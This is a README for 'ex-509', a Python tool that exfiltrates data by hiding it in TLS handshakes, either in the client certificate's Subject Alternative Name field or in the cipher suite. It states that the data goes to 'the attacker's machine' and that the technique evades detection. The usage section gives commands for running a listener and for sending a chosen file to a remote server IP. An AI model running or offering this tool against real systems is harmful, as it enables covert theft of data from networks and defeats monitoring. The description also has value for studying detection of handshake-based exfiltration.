# ex-509
> Data exfiltration abusing x509 certificates

In order for a TLS session to be established, some data must first be exchanged between the client and server. These exfiltration techniques take advantage of this, and hide data in the TLS handshake itself. Ex-509 includes two modes of operation: certificate and cipher. In certificate mode, payload data is stored in the Subject Alternative Name (SAN) field of the client certificate. In cipher mode, data is hidden in the cipher suite of the handshake. These are both sent to the attacker's machine before an actual session is established, which makes the exfiltration harder to detect.

## Requirements
Python >= 3.6


Use the package manager [pip](https://pip.pypa.io/en/stable/) to install the required libraries.

* On both the client and server machines, [cryptography](https://pypi.org/project/cryptography/) is required for certificate generation and parsing

* On the server machine, [tlslite-ng](https://pypi.org/project/tlslite-ng/) is required for more control over the TLS handshake

## Usage
Each technique has its own standalone client and server


### Server
Start listening for connections:
```sh
python3 ex-509.py
```

To specify a custom certificate, private key, or port number:
```sh
python3 ex-509.py --cert [PATH TO CERT] --key [PATH TO KEY] --port [PORT]
```

*If no certificate is specified, one will be generated and used automatically*

### Client
Sending a file to the server:
```sh
python3 client.py -f [PATH TO FILE] -i [SERVER IP] -p [PORT]
```

## Notes
In cipher mode, the cryptography package isn't required by the client, as no certificates need to be created.

Also, due to the size limitations, when transferring a large file in cipher mode, it may be chunked up into several smaller pieces. To easily combine them use: [combine](https://github.com/adeemm/combine)